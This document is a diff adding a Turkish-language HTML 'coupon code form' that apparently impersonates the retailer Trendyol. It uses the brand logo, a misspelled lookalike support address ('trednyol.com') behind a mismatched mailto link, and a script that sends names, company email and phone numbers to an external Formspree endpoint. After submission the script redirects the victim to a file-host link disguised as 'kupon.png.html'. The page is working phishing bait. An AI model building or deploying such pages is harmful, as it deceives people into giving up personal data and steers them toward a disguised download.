@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kupon Kodu Formu</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: url('images/arka2.png') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: flex-start; /* Ortadan sola geçiş */
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            margin-left: 100px; /* Sol tarafta biraz boşluk bırakmak için */
+        }
+
+        h1 {
+            color: #ff7e5f;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        label {
+            margin-bottom: 5px;
+            color: #333;
+            align-self: flex-start;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            padding: 12px 20px;
+            background-color: #ff7e5f;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #feb47b;
+        }
+
+        .form-icon {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .contact-info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .form-success {
+            display: none;
+            color: #4CAF50;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="images/trendyol.png" alt="Trendyol Logo" class="form-icon">
+        <h1>Kupon Kodu Formu</h1>
+        <form id="couponForm" action="https://formspree.io/f/meojabev" method="POST">
+            <label for="firstName">Ad:</label>
+            <input type="text" id="firstName" name="firstName" required>
+
+            <label for="lastName">Soyad:</label>
+            <input type="text" id="lastName" name="lastName" required>
+
+            <label for="email">Şirket Mail Adresi:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="phone">Telefon Numarası:</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <label for="couponCode">Size Gönderilen Link:</label>
+            <input type="text" id="couponCode" name="couponCode" required>
+
+            <input type="submit" value="Gönder">
+        </form>
+        <div class="form-success">Formunuz başarıyla gönderildi! Lütfen yönlendirileceğiniz sayfayı bekleyin...</div>
+        <div class="contact-info">
+            <p>Destek için <a href="mailto:support@example.com">destektrendyol@trednyol.com</a> ile iletişime geçebilirsiniz.</p>
+        </div>
+    </div>
+    <script>
+        document.getElementById('couponForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Formun normal şekilde gönderilmesini engeller
+
+            var form = event.target;
+            var formData = new FormData(form);
+
+            fetch(form.action, {
+                method: form.method,
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(function(response) {
+                if (response.ok) {
+                    document.querySelector('.form-success').style.display = 'block'; // Başarı mesajını göster
+                    setTimeout(function() {
+                        window.location.href = 'https://dosya.co/8mbuod7gqwa1/kupon.png.html'; // Yönlendirilecek URL
+                    }, 2000); // 2 saniye beklemeden sonra yönlendir
+                } else {
+                    alert('Form gönderilirken bir hata oluştu.');
+                }
+            }).catch(function(error) {
+                console.error('Error:', error);
+                alert('Form gönderilirken bir hata oluştu.');
+            });
+        });
+    </script>
+</body>
+</html>
